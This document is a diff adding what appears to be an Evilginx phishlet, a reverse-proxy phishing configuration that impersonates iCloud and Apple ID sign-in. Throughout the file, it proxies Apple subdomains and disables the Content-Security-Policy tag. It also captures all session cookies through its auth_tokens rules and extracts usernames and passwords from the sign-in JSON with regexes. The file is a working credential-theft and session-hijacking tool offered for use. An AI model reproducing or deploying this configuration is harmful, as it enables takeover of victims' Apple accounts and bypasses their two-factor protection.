@@ -1,0 +1,84 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true}
+  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false}
+  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false}
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'icloud.com', session: true, is_landing: false}
+
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false}
+
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: false, is_landing: false}
+
+  - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'www-apple', orig_sub: 'www', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'gsa', orig_sub: 'gsa', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'appleid-apple', orig_sub: 'appleid', domain: 'apple.com', session: true, is_landing: false}
+
+sub_filters:
+  # Break the Content Security Policy html meta tag
+  - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: 'Content-Security-Policy', replace: 'X-CSP-Disabled', mimes: ['text/html']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: '', domain: 'apple.com', search: 'Content-Security-Policy', replace: 'X-CSP-Disabled', mimes: ['text/html']}
+
+  # icloud.com domain rewrites
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'p', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"{domain}"', replace: '"{domain}"', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+  # apple.com domain rewrites
+  - {triggers_on: 'www.icloud.com', orig_sub: 'idmsa', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www-apple', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'gsa', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'appleid-apple', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+  # CDN rewrites
+  - {triggers_on: 'www.icloud.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  # idmsa.apple.com triggers
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'www', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'setup', domain: 'icloud.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'gsa', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'appleid-apple', domain: 'apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  # Fix redirect location header parsing
+  - {triggers_on: 'appleid.cdn-apple.com', orig_sub: '', domain: '', search: '(t\.getResponseHeader\("Location"\)\))', replace: '(new URL(t.getResponseHeader("Location")).pathname))', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+
+auth_tokens:
+  - domain: '.icloud.com'
+    keys: ['.*,regexp']
+  - domain: 'www.icloud.com'
+    keys: ['.*,regexp']
+  - domain: 'setup.icloud.com'
+    keys: ['.*,regexp']
+  - domain: '.apple.com'
+    keys: ['.*,regexp']
+  - domain: 'idmsa.apple.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: ''
+    search: '"accountName"\s*:\s*"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password"\s*:\s*"([^"]*)'
+    type: 'json'
+
+# Apple ID authentication endpoints
+auth_urls:
+  - '/appleauth/auth/signin'
+  - '/appleauth/auth'
+  - '/appleauth/auth/federate'
+
+login:
+  domain: 'www.icloud.com'
+  path: '/'
